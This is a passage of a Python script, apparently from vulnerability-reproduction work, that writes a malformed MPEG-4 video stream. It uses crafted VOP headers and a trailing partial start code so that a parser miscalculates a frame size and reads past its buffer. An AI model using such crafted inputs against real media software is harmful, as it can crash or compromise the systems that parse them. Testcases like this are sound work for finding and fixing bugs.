- marker_bit: 1\n    # - video_object_layer_width: 320 (13 bits)\n    # - marker_bit: 1\n    # - video_object_layer_height: 240 (13 bits)\n    # - marker_bit: 1\n    # - interlaced: 0\n    # - obmc_disable: 1\n    # Total: need to craft bit-level data\n    \n    vol_data = bytearray()\n    # Simplified VOL header (enough bits to make parser happy)\n    vol_data.extend(b\'\\x01\\x12\\x75\\x30\\xc0\\x00\\xa0\\x00\\x78\\x04\')\n    f.write(vol_data)\n    \n    # 4. First VOP (Video Object Plane) - this is where we trigger the issue\n    # The VOP header parsing will calculate a frame size\n    write_start_code(f, M4V_VOP_START_CODE)\n    \n    # VOP header with malformed size indication\n    # vop_coding_type: 00 (I-frame, 2 bits)\n    # modulo_time_base: 0 (1 bit)\n    # marker_bit: 1\n    # vop_time_increment: some value\n    # marker_bit: 1\n    # vop_coded: 1\n    # ... more fields\n    \n    # Craft VOP data that will cause parser to return a large size\n    vop_data = bytearray()\n    vop_data.extend(b\'\\x80\')  # Start of VOP header bits\n    \n    # Add padding to make the packet a certain size\n    # The trick: we want the parser to think there\'s more data than actually present\n    vop_data.extend(b\'\\x00\' * 20)\n    f.write(vop_data)\n    \n    # 5. Add another start code close by to confuse size calculation\n    # This will cause the parser to compute size incorrectly\n    write_start_code(f, M4V_VOP_START_CODE)\n    f.write(b\'\\x80\')\n    \n    # 6. Add some more data but not enough for what parser expects\n    f.write(b\'\\x00\' * 10)\n    \n    # 7. Critical: Add partial start code at the end\n    # This causes bytes_in_header to be set, which then gets added to size\n    # When size is already close to remain, this pushes it over\n    f.write(b\'\\x00\\x00\\x01\')  # Partial start code (missing the type byte)\n\nprint(f"Generated testcase at {output_path}")\nprint(f"File size: {open(output_path, \'rb\').read().__len__()} bytes")\n'}
